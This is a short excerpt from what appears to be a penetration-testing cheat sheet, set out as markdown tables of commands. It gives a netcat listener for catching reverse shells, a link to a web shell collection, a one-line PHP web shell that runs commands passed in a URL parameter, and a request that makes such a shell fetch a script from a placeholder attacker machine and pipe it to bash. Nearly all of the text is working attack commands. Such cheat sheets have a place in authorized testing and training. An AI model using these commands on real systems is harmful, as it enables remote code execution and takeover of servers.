...
| `rlwrap nc -lnvp 4444` | Starts interactive shell listener |
...
best web shells <https://github.com/TheBinitGhimire/Web-Shells>

| **Command** | **Description** |
|---|-----|
| `<?php system($_GET["cmd"]); ?>` | PHP web shell |
| `/shell.php?cmd=curl%20<attack_ip>:<attack_port>/revsh.sh\|bash` | To fetch and execute payload from attack machine |
